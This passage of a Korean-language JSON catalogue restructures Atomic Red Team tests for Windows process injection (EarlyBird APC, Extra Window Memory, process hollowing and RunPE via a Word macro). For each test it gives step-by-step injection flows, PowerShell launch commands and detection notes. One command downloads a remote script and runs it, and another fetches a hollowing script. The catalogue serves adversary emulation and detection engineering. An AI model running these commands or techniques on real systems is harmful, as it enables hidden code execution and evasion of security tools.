        "registry_keys": [],
        "processes": [
          {
            "name": "T1055.exe",
            "description": "다양한 프로세스 인젝션(특히 APC 관련 기법 포함)을 수행하는 C# 인젝터"
          },
          {
            "name": "cmd.exe / powershell.exe",
            "description": "T1055.exe 실행을 담당하는 런처 프로세스"
          }
        ],
        "network": []
      },
      "cleanup": [
        "T1055.exe 실행 후 생성된 테스트용 프로세스(calc.exe, notepad.exe, 기타 스폰된 프로세스)가 있다면 수동 또는 스크립트로 종료한다.",
        "실험 환경 정리를 위해 필요시 PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe를 삭제한다.",
        "EDR/로그 분석 실습 시에는 이 실행 흔적(프로세스 트리, 메모리 스냅샷, Event Log)을 보존하여 탐지 규칙 설계에 활용한다."
      ],
      "metadata": {
        "atomic_source_id": "611b39b7-e243-4c81-87a4-7145a90358b1"
      }
    },

    {
      "test_id": "T1055.004-2",
      "name": "EarlyBird APC Queue Injection in Go",
      "platforms": ["windows"],
      "summary": "Go로 구현된 EarlyBird 기법을 사용해, 서스펜드 상태로 생성한 프로세스에 QueueUserAPC를 걸어 스레드가 재개되기 직전에 셸코드를 실행하는 실습.",
      "procedure": [
        "1) 사전 준비:",
        "   - EarlyBird.exe가 다음 경로에 존재한다고 가정한다:",
        "     · PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe",
        "",
        "2) PowerShell에서 인젝션 도구 실행:",
        "   - 명령:",
        "     · $PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \"C:\\Windows\\System32\\werfault.exe\" -debug",
        "   - 주요 동작(일반적인 EarlyBird APC 인젝션 흐름):",
        "     1) CreateProcess API를 사용해 대상 프로그램(기본: werfault.exe)을 suspended 상태로 생성한다.",
        "     2) 대상 프로세스의 메모리 공간에 VirtualAllocEx 등으로 셸코드 영역을 할당하고, WriteProcessMemory로 셸코드를 기록한다.",
        "     3) 대상 프로세스의 메인 스레드(또는 특정 스레드)에 QueueUserAPC를 사용해 셸코드 시작 주소를 User APC로 등록한다.",
        "     4) ResumeThread를 호출하여 프로세스를 재개하면, 초기 단계에서 NtTestAlert가 호출되면서 등록된 APC가 실행되고 셸코드가 동작한다.",
        "   - -debug 옵션으로 내부 상태나 디버깅 메시지를 콘솔에서 확인할 수 있다.",
        "",
        "3) 결과:",
        "   - 셸코드 내부 구현에 따라 calc.exe, 메시지 박스, 혹은 다른 행위가 실행된다(Atomic 설명에서는 CalculatorApp 종료를 cleanup에서 수행).",
        "",
        "4) 정리(Cleanup):",
        "   - 스크립트 cleanup에서 다음 명령을 수행:",
        "     · Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue",
        "     · Stop-Process -Name werfault -ErrorAction SilentlyContinue",
        "   - 이를 통해 테스트 중 생성된 werfault.exe 및 CalculatorApp 프로세스를 정리한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \"#{spawn_process_path}\" -debug",
          "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\r\nStop-Process -Name \"#{spawn_process_name}\" -ErrorAction SilentlyContinue"
        }
      ],
      "prerequisites": [
        "EarlyBird.exe가 PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe 경로에 존재해야 한다.",
        "테스트 대상 바이너리(기본: C:\\Windows\\System32\\werfault.exe)가 시스템에 존재해야 한다.",
        "Windows 환경에서 PowerShell을 사용할 수 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe",
            "description": "EarlyBird APC Queue 인젝션을 수행하는 Go 기반 바이너리 (실험용)"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe",
            "description": "PowerShell에서 직접 실행되는 인젝션 도구"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "werfault.exe",
            "description": "서스펜드 상태로 생성된 후 APC 인젝션을 통해 셸코드를 실행하는 대상 프로세스"
          },
          {
            "name": "EarlyBird.exe",
            "description": "QueueUserAPC 기반 EarlyBird 인젝션을 수행하는 인젝터"
          },
          {
            "name": "CalculatorApp",
            "description": "셸코드 동작 결과로 생성되는 계산기 앱(테스트용 페이로드)"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue",
        "Stop-Process -Name werfault -ErrorAction SilentlyContinue",
        "필요시 EarlyBird.exe 파일을 삭제하거나 별도 샌드박스에서만 유지한다.",
        "EDR/로그 분석 시 APC Queue 관련 이벤트(스레드 컨텍스트, CreateProcess, QueueUserAPC 등)를 수집해 탐지 룰에 반영한다."
      ],
      "metadata": {
        "atomic_source_id": "73785dd2-323b-4205-ab16-bb6f06677e14"
      }
    },

    {
      "test_id": "T1055.004-3",
      "name": "NtQueueApcThreadEx 기반 Special User APC 인젝션 (로컬 셸코드 실행)",
      "platforms": ["windows"],
      "summary": "NtQueueApcThreadEx WinAPI를 사용해 현재 스레드에 Special User APC를 등록하고, 로컬 프로세스 내에서 셸코드를 실행하는 시나리오.",
      "procedure": [
        "1) 사전 준비:",
        "   - NtQueueApcThreadEx.exe가 다음 경로에 존재한다고 가정:",
        "     · PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe",
        "",
        "2) PowerShell에서 도구 실행:",
        "   - 명령:",
        "     · $PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe -debug",
        "   - 내부 동작(일반적인 로컬 APC 인젝션 흐름):",
        "     1) VirtualAlloc 를 통해 현재 프로세스 주소 공간에 RW 권한으로 메모리 영역을 할당한다.",
        "     2) RtlCopyMemory 를 사용해 셸코드를 해당 영역에 복사한다.",
        "     3) VirtualProtect 로 메모리 권한을 RX(Execute/Read)로 변경한다.",
        "     4) NtQueueApcThreadEx 를 통해 현재 스레드 핸들에 Special User APC를 등록하고, 그 APC가 셸코드 주소를 가리키도록 설정한다.",
        "     5) 스레드가 alertable 상태로 전환될 때 APC가 트리거되며 셸코드가 실행된다.",
        "",
        "3) 결과:",
        "   - 구현된 셸코드에 따라 CalculatorApp 실행 또는 메시지 박스 표시 등 테스트용 행동이 발생한다.",
        "",
        "4) 정리(Cleanup):",
        "   - cleanup_command에서 CalculatorApp 프로세스를 종료:",
        "     · Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue",
        "   - 필요시 NtQueueApcThreadEx.exe 파일도 제거해 흔적을 줄인다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe -debug",
          "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
        }
      ],
      "prerequisites": [
        "NtQueueApcThreadEx.exe가 PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe 경로에 존재해야 한다.",
        "Windows 환경에서 PowerShell을 사용할 수 있어야 한다.",
        "테스트 환경에서 CalculatorApp 실행이 차단되어 있지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe",
            "description": "NtQueueApcThreadEx 기반 Special User APC 인젝션 테스트용 바이너리"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe",
            "description": "PowerShell에서 실행되는 로컬 APC 인젝션 도구"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "NtQueueApcThreadEx.exe",
            "description": "현재 프로세스/스레드에 Special User APC를 등록하여 셸코드를 실행하는 테스트 도구"
          },
          {
            "name": "CalculatorApp",
            "description": "셸코드 실행 결과 생성되는 계산기 앱(테스트용 페이로드)"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue",
        "테스트 후 필요시 NtQueueApcThreadEx.exe 파일을 삭제한다.",
        "APC 관련 동작(스레드 상태 변경, VirtualAlloc, VirtualProtect 호출 등)을 기반으로 EDR/로그 탐지 규칙을 설계할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "4cc571b1-f450-414a-850f-879baf36aa06"
      }
    }
  ]
},
{
  "technique_id": "T1055.011",
  "technique_name": "Process Injection: Extra Window Memory Injection",
  "tactic": "Defense Evasion",
  "description": "윈도우 GUI 객체가 가지는 Extra Window Memory(EWM, 추가 윈도우 메모리) 영역에 페이로드를 저장하고, 윈도우 프로시저/훅 함수 등을 통해 해당 영역의 코드를 실행시키는 인젝션 기법이다. 일반적인 VirtualAlloc/WriteProcessMemory/CreateRemoteThread 패턴 대신 GUI 서브시스템의 메모리 구조를 악용하기 때문에, 일부 탐지 로직을 우회하는 데 활용될 수 있다.",

  "tests": [
    {
      "test_id": "T1055.011-1",
      "name": "Process Injection via Extra Window Memory (EWM) x64 executable",
      "platforms": ["windows"],
      "summary": "x64 또는 x86용 EWM 인젝션 전용 PE(T1055.011_#{arch}.exe)를 실행해, 대상 프로세스의 윈도우 객체 Extra Window Memory 영역에 페이로드(payload.exe_#{arch}.bin)를 적재하고 훅을 통해 실행하는 시나리오.",
      "procedure": [
        "1) 사전 조건(의존성) 준비:",
        "   - arch 입력값(x64 또는 x86)에 따라 다음 두 파일 경로가 결정된다.",
        "     · exe_binary: PathToAtomicsFolder\\T1055.011\\bin\\T1055.011_#{arch}.exe",
        "     · payload_file: PathToAtomicsFolder\\T1055.011\\bin\\payload.exe_#{arch}.bin",
        "",
        "   - PowerShell 의존성 단계에서 다음을 수행한다:",
        "     1) (split-path #{exe_binary}) 경로에 디렉터리가 없으면 New-Item으로 생성.",
        "     2) GitHub(redcanaryco/atomic-red-team)에서 다음 두 파일을 다운로드:",
        "        · T1055.011_#{arch}.exe  →  #{exe_binary}",
        "        · payload.exe_#{arch}.bin → #{payload_file}",
        "     3) 두 파일이 모두 존재하면 prereq_command가 0을 반환하여 테스트 실행이 가능해진다.",
        "",
        "2) EWM 인젝션 실행:",
        "   - PowerShell 실행기에서 다음 명령을 수행한다:",
        "     · #{exe_binary}",
        "",
        "   - EWM 인젝터(#{exe_binary}) 내부 동작(일반적인 Extra Window Memory 인젝션 흐름 예시):",
        "     1) 자체 GUI 윈도우(또는 대상 프로세스의 윈도우 핸들)를 생성하거나 열고, 해당 윈도우에 Extra Window Memory(EWM)를 할당한다.",
        "        · 보통 CreateWindowEx, RegisterClassEx, SetWindowLongPtr(GWLP_USERDATA, GWL_EXSTYLE 등)과 같은 Win32 API를 활용.",
        "     2) payload_file에 있는 raw 페이로드(payload.exe_#{arch}.bin)를 읽어 들여, EWM 영역에 복사하거나, EWM에 페이로드 주소/구조체 포인터를 저장한다.",
        "     3) 윈도우 프로시저(WindowProc) 후킹 또는 API 훅을 통해 특정 메시지/이벤트가 발생했을 때, EWM에 저장된 페이로드를 실행하도록 로직을 구성한다.",
        "        · 예: WM_PAINT, WM_TIMER 등 메시지 처리 시 EWM에 있는 코드/주소를 호출.",
        "     4) 최종적으로, EWM에 적재된 페이로드가 대상 프로세스의 컨텍스트에서 실행된다.",
        "        · Atomic 테스트에서는 일반적으로 notepad.exe 등 눈에 보이는 프로세스를 스폰해 동작 여부를 확인하는 경우가 많다.",
        "",
        "3) 결과 확인:",
        "   - 인젝션이 성공하면, 테스트용 페이로드에 따라 다음과 같은 현상이 발생할 수 있다:",
        "     · Notepad.exe 실행, 메시지 박스 출력, 기타 샘플 동작.",
        "   - 메모리 포렌식 또는 EDR 관점에서는:",
        "     · GUI 프로세스의 윈도우 구조체(Extra Window Memory 영역)에 평소와 다른 코드/포인터가 존재.",
        "     · 일반적인 VirtualAllocEx/WriteProcessMemory/CreateRemoteThread 시그니처 없이 코드 실행 흔적.",
        "",
        "4) 정리(Cleanup):",
        "   - Atomic 정의에 따른 PowerShell cleanup_command:",
        "     · Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "   - 이는 테스트 중 실행된 notepad 프로세스를 강제로 종료한다.",
        "   - 필요시 PathToAtomicsFolder\\T1055.011\\bin 디렉터리 및 다운로드된 T1055.011_#{arch}.exe, payload.exe_#{arch}.bin 파일도 수동으로 삭제해 환경을 원상 복구한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "#{exe_binary}",
          "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
        }
      ],
      "prerequisites": [
        "Windows 환경에서 PowerShell 실행이 가능해야 한다.",
        "arch 파라미터(x64 또는 x86)에 맞는 바이너리와 페이로드 파일이 존재해야 한다:",
        "  · PathToAtomicsFolder\\T1055.011\\bin\\T1055.011_#{arch}.exe",
        "  · PathToAtomicsFolder\\T1055.011\\bin\\payload.exe_#{arch}.bin",
        "존재하지 않는 경우, get_prereq_command에서 GitHub에서 두 파일을 다운로드해 준비한다.",
        "테스트 결과를 눈으로 확인하려면 Notepad 실행이 차단되어 있지 않은 환경이 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1055.011\\bin\\T1055.011_#{arch}.exe",
            "description": "Extra Window Memory(EWM) 인젝션을 수행하는 테스트용 PE 바이너리"
          },
          {
            "path": "PathToAtomicsFolder\\T1055.011\\bin\\payload.exe_#{arch}.bin",
            "description": "EWM 영역에 주입되는 raw 페이로드(실행 코드 바이너리)"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1055.011\\bin\\payload.exe_#{arch}.bin",
            "description": "인젝션 시 EWM에 적재되는 페이로드 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "T1055.011_#{arch}.exe",
            "description": "Extra Window Memory를 활용해 페이로드를 주입·실행하는 인젝터 프로세스"
          },
          {
            "name": "Notepad.exe",
            "description": "페이로드 동작 확인용으로 사용되는 테스트 프로세스(존재 시 cleanup에서 종료됨)"
          }
        ],
        "network": []
      },
      "cleanup": [
        "PowerShell cleanup_command에 따라 Notepad 프로세스를 강제 종료:",
        "  · Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "환경 정리를 위해 필요시 PathToAtomicsFolder\\T1055.011\\bin 내에 생성된 T1055.011_#{arch}.exe와 payload.exe_#{arch}.bin을 삭제한다.",
        "포렌식/탐지 연구 목적이라면, 프로세스 메모리 덤프와 윈도우 구조체(EWM 영역) 상태를 별도 보관해 탐지 룰 설계에 활용한다."
      ],
      "metadata": {
        "atomic_source_id": "93ca40d2-336c-446d-bcef-87f14d438018"
      }
    }
  ]
},
{
  "technique_id": "T1055.012",
  "technique_name": "Process Injection: Process Hollowing",
  "tactic": "Defense Evasion",
  "description": "프로세스 할로잉(Process Hollowing)은 정상 프로세스를 일단 생성한 뒤, 그 프로세스의 메모리(이미지 섹션)를 비우고(Mapping 제거/Unmap) 그 자리에 악성 코드(다른 PE 또는 셸코드)를 덮어써서, 겉보기에는 정상 프로세스처럼 보이지만 내부에는 다른 코드를 실행하게 만드는 인젝션 기법이다. 주로 부모-자식 관계를 정상 프로세스(explorer, notepad 등)로 위장해 보안 제품 및 분석을 회피하는 데 활용된다.",

  "tests": [
    {
      "test_id": "T1055.012-1",
      "name": "Process Hollowing using PowerShell",
      "platforms": ["windows"],
      "summary": "FuzzySecurity의 Start-Hollow.ps1 스크립트를 이용해, explorer를 부모 프로세스로 두고 notepad.exe를 스폰서(sponsor) 프로세스로 생성한 뒤, 그 내부를 hollow_binary(cmd.exe)로 교체해 실행하는 PowerShell 기반 프로세스 할로잉 시나리오.",
      "procedure": [
        "1) 의존성(Prereq) 준비:",
        "   - script_path: Start-Hollow.ps1가 저장될 경로",
        "       · 기본값: PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1",
        "   - script_download_url: Start-Hollow.ps1 다운로드 URL",
        "       · 기본값: https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/720d8fe82396faf74f2ca19a3fe99a5c262a14b9/Start-Hollow.ps1",
        "",
        "   - PowerShell dependency 단계:",
        "     1) prereq_command:",
        "        · if (Test-Path \"#{script_path}\") {exit 0} else {exit 1}",
        "        → script_path에 파일이 없으면 get_prereq_command 실행.",
        "     2) get_prereq_command:",
        "        · iwr \"#{script_download_url}\" -OutFile (New-Item -Path #{script_path} -Force)",
        "        → GitHub에서 Start-Hollow.ps1를 다운로드해 script_path에 저장.",
        "",
        "2) 프로세스 할로잉 실행:",
        "   - PowerShell executor에서 다음 명령을 실행:",
        "     · . \"#{script_path}\"",
        "       - Start-Hollow.ps1 스크립트를 dot-source로 로드해 현재 세션에 Start-Hollow 함수 등록.",
        "",
        "     · $ppid = Get-Process #{parent_process_name} | select -expand id",
        "       - parent_process_name(기본 explorer)의 PID를 얻어 부모 프로세스로 사용할 PID 확보.",
        "",
        "     · Start-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose",
        "       - Sponsor: 할로잉 당하는 껍데기 프로세스 (기본: C:\\Windows\\System32\\notepad.exe)",
        "       - Hollow: 실제로 실행할 바이너리 (기본: C:\\Windows\\System32\\cmd.exe)",
        "       - ParentPID: explorer PID → 프로세스 트리에서 자식이 정상적으로 보이도록 위장.",
        "",
        "   - 일반적인 Start-Hollow 동작 흐름(요약):",
        "     1) 지정한 ParentPID(explorer)를 부모로 하는 Sponsor 프로세스(notepad.exe)를 CREATE_SUSPENDED 상태로 생성.",
        "     2) Sponsor 프로세스의 메모리에서 원래 PE 이미지(notepad.exe)를 언맵/제거.",
        "     3) Hollow 바이너리(cmd.exe)를 읽어와 Sponsor 프로세스의 주소 공간에 매핑하고, 섹션 및 엔트리 포인트를 재설정.",
        "     4) 수정된 엔트리 포인트로 스레드를 재개(Resume)하여, 겉은 notepad.exe지만 내부는 cmd.exe가 동작하는 프로세스를 생성.",
        "",
        "3) 결과:",
        "   - 프로세스 트리 상에서는 explorer → notepad (스폰서) 구조로 보이지만, 실질적으로 notepad 프로세스는 cmd.exe 코드가 구동되는 할로잉 상태.",
        "   - EDR/포렌식에서는 PE 헤더·섹션과 이미지 경로가 불일치하는 점, 의심스러운 메모리 매핑 API 호출 패턴 등을 통해 탐지할 수 있다.",
        "",
        "4) 정리(Cleanup):",
        "   - Atomic 정의된 cleanup_command:",
        "     · Stop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore",
        "     → 기본값: notepad 이름의 프로세스를 종료.",
        "   - 추가로 원한다면 Start-Hollow.ps1 파일과 다운로드 폴더를 수동으로 삭제해 환경을 원복할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": ". \"#{script_path}\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose",
          "cleanup_command": "Stop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore"
        }
      ],
      "prerequisites": [
        "Windows에서 PowerShell 실행 가능해야 함.",
        "script_path 위치에 Start-Hollow.ps1가 존재해야 함 (없으면 get_prereq_command로 다운로드).",
        "parent_process_name(기본 explorer)가 실제로 실행 중이어야 ParentPID를 얻을 수 있음.",
        "sponsor_binary_path, hollow_binary_path(기본 notepad.exe, cmd.exe)가 시스템에 존재해야 함."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1",
            "description": "FuzzySecurity의 PowerShell 기반 Process Hollowing 스크립트"
          }
        ],
        "files_read": [
          {
            "path": "C:\\Windows\\System32\\cmd.exe (기본값)",
            "description": "할로잉 후 실제로 실행되는 Hollow 바이너리"
          },
          {
            "path": "C:\\Windows\\System32\\notepad.exe (기본값)",
            "description": "껍데기 역할(Sponsor)로 사용되는 정상 프로세스 바이너리"
          }
        ],
        "processes": [
          {
            "name": "explorer.exe",
            "description": "ParentPID로 사용되는 부모 프로세스 (프로세스 트리 위장용)"
          },
          {
            "name": "notepad.exe",
            "description": "할로잉되어 내부에 cmd.exe 코드가 주입되는 스폰서 프로세스"
          },
          {
            "name": "powershell.exe",
            "description": "Start-Hollow.ps1을 로드하고 Start-Hollow 함수를 호출하는 실행 환경"
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "PowerShell cleanup_command에 따라 notepad 프로세스를 종료:",
        "  · Stop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore  (기본 notepad)",
        "테스트 환경 정리를 위해 Start-Hollow.ps1 및 PathToAtomicsFolder\\T1055.012\\src 폴더를 수동으로 삭제할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "562427b4-39ef-4e8c-af88-463a78e70b9c"
      }
    },

    {
      "test_id": "T1055.012-2",
      "name": "RunPE via VBA (WINWORD → notepad)",
      "platforms": ["windows"],
      "summary": "악성 매크로(Invoke-MalDoc + T1055.012-macrocode.txt)를 통해 WINWORD.EXE 프로세스 내부에서 notepad.exe를 RunPE/할로잉 방식으로 실행하는 시나리오.",
      "procedure": [
        "1) 의존성(Prereq) 준비:",
        "   - ms_product: Word 등 Office 제품명 (기본값: Word)",
        "",
        "   - Microsoft #{ms_product} 설치 여부 확인:",
        "     · try {",
        "         New-Object -COMObject \"#{ms_product}.Application\" | Out-Null",
        "         $process = \"#{ms_product}\"; if ($process -eq \"Word\") {$process = \"winword\"}",
        "         Stop-Process -Name $process",
        "         exit 0",
        "       } catch { exit 1 }",
        "     → Word COM 객체 생성에 실패하면 요구사항 불충족.",
        "   - 설치되어 있지 않으면 수동 설치 안내 메시지만 출력(get_prereq_command).",
        "",
        "2) 말웨어 문서 실행(Invoke-MalDoc):",
        "   - PowerShell executor에서 다음 명령을 실행:",
        "     1) [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
        "     2) IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)",
        "     3) Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"",
        "",
        "   - 동작 개요:",
        "     · Invoke-MalDoc.ps1 스크립트를 로드해, 지정한 macroFile(T1055.012-macrocode.txt)을 포함하는 Office 문서를 실행.",
        "     · 'Exploit' 서브루틴을 가진 VBA 매크로가 WINWORD.EXE 내부에서 실행되며, RunPE/Process Hollowing 형태로 notepad.exe를 Word 프로세스 컨텍스트에서 실행하도록 구현되어 있음.",
        "",
        "3) 결과:",
        "   - Word가 열리면서 내부적으로 notepad.exe 실행 코드가 수행되고, 프로세스 트리/메모리 구조 상 Word와 notepad 간 비정상적인 관계가 나타날 수 있다.",
        "   - 포렌식 측면에서는 Office 프로세스(WINWORD.EXE) 메모리 내에 notepad PE 구조 또는 RunPE 흔적(매핑되지 않은 섹션, 재배치 흔적 등)이 존재하는지 확인할 수 있다.",
        "",
        "4) 정리(Cleanup):",
        "   - Atomic 정의에는 별도 cleanup_command가 없고, 일반적으로 테스트 후 Word/Notepad를 종료하면 된다.",
        "   - 실험 환경에서는:",
        "     · PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt",
        "     · 다운로드된 Invoke-MalDoc.ps1",
        "     등을 삭제해 흔적을 최소화할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\""
        }
      ],
      "prerequisites": [
        "Microsoft Word(또는 지정한 ms_product)가 설치되어 있어야 한다.",
        "Word COM 객체 생성이 가능해야 한다.",
        "인터넷이 허용되어 있어야 Invoke-MalDoc.ps1를 GitHub에서 다운로드할 수 있다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt",
            "description": "RunPE/Process Hollowing 로직을 포함하는 VBA 매크로 코드 파일"
          }
        ],
        "files_read": [],
        "processes": [
          {
            "name": "WINWORD.EXE",
            "description": "매크로 실행 및 RunPE/Process Hollowing이 수행되는 호스트 프로세스"
          },
          {
            "name": "notepad.exe",
            "description": "Word 프로세스 내부에서 실행되는 페이로드 프로세스(표면상/내부 구조 관계는 매크로 구현에 따라 달라짐)"
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "테스트 종료 후 Word와 Notepad 프로세스를 모두 종료한다.",
        "연구 환경이 아니라면, PathToAtomicsFolder\\T1055.012\\src 하위 매크로 파일과 Invoke-MalDoc.ps1를 삭제해 흔적을 최소화한다."
      ],
      "metadata": {
        "atomic_source_id": "3ad4a037-1598-4136-837c-4027e4fa319b"
      }
    },

    {
      "test_id": "T1055.012-3",
      "name": "Process Hollowing in Go using CreateProcessW / CreatePipe",
      "platforms": ["windows"],
      "summary": "Go로 작성된 헬퍼 바이너리(CreateProcess.exe, CreateProcessWithPipe.exe)를 이용해 werfault.exe 같은 정상 PE를 일단 Suspended 상태로 띄운 뒤, 그 내부를 셸코드로 대체(할로잉)하고 calc.exe를 자식 프로세스로 생성하는 시나리오 두 가지(파이프 미사용/사용).",
      "subtests": [
        {
          "name": "CreateProcess.exe 기반 Process Hollowing",
          "input_arguments": [
            "hollow_binary_path (기본: C:\\Windows\\System32\\werfault.exe)",
            "hollow_process_name (기본: werfault)"
          ],
          "procedure": [
            "1) PowerShell에서 다음 명령 실행:",
            "   · $PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcess.exe -program \"#{hollow_binary_path}\" -debug",
            "",
            "2) 내부 동작(일반적인 Process Hollowing 흐름):",
            "   1) CreateProcessW를 이용해 hollow_binary_path(기본 werfault.exe)를 CREATE_SUSPENDED 플래그로 생성.",
            "   2) 대상 프로세스의 메모리에서 원래 이미지 맵핑을 제거하거나 덮어쓸 준비를 함.",
            "   3) 내장된 셸코드(또는 다른 PE)를 대상 프로세스 주소 공간에 작성하고, 엔트리 포인트를 해당 영역으로 설정.",
            "   4) 스레드를 Resume하여, 겉보기에는 werfault.exe지만 내부에서 셸코드(calc.exe 실행 등)가 동작.",
            "",
            "3) cleanup_command:",
            "   · Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue",
            "   · Stop-Process -Name \"#{hollow_process_name}\" -ErrorAction SilentlyContinue",
            "   → 기본적으로 calc와 werfault 프로세스를 종료."
          ]
        },
        {
          "name": "CreateProcessWithPipe.exe 기반 Process Hollowing + 익명 파이프",
          "input_arguments": [
            "hollow_binary_path (기본: C:\\Windows\\System32\\werfault.exe)",
            "hollow_process_name (기본: werfault)"
          ],
          "procedure": [
            "1) PowerShell에서 다음 명령 실행:",
            "   · $PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -program \"#{hollow_binary_path}\" -debug",
            "",
            "2) 내부 동작(공통 Process Hollowing + 파이프 통신):",
            "   1) CreateProcessW로 werfault.exe를 Suspended 상태로 생성.",
            "   2) CreatePipe를 이용해 부모·자식 프로세스 간 익명 파이프를 생성.",
            "      - 이 파이프를 통해 셸코드 실행 결과(출력)를 부모 프로세스로 수집할 수 있음.",
            "   3) 대상 프로세스를 할로잉하고, 셸코드가 실행되면서 생성하는 출력이 파이프를 통해 부모로 전송.",
            "   4) 부모 프로세스는 파이프에서 데이터를 읽어 디버그 출력 또는 로그로 남긴다.",
            "",
            "3) cleanup_command:",
            "   · Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue",
            "   · Stop-Process -Name \"#{hollow_process_name}\" -ErrorAction SilentlyContinue"
          ]
        }
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcess.exe -program \"#{hollow_binary_path}\" -debug",
          "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"#{hollow_process_name}\" -ErrorAction SilentlyContinue"
        },
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -program \"#{hollow_binary_path}\" -debug",
          "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"#{hollow_process_name}\" -ErrorAction SilentlyContinue"
        }
      ],
      "prerequisites": [
        "PathToAtomicsFolder\\T1055.012\\bin\\x64 경로에 CreateProcess.exe, CreateProcessWithPipe.exe가 존재해야 한다.",
        "테스트에 사용할 hollow_binary_path(기본: werfault.exe)가 실제로 존재해야 한다.",
        "PowerShell에서 외부 exe 실행이 허용되어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "C:\\Windows\\System32\\werfault.exe (기본값)",
            "description": "할로잉 대상으로 사용되는 정상 바이너리"
          }
        ],
        "processes": [
          {
            "name": "werfault.exe",
            "description": "Suspended 상태로 생성된 후 내부가 셸코드로 대체되는 할로잉 대상 프로세스"
          },
          {
            "name": "CalculatorApp (또는 calc.exe)",
            "description": "셸코드 실행 결과로 생성되는 예시 프로세스"
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
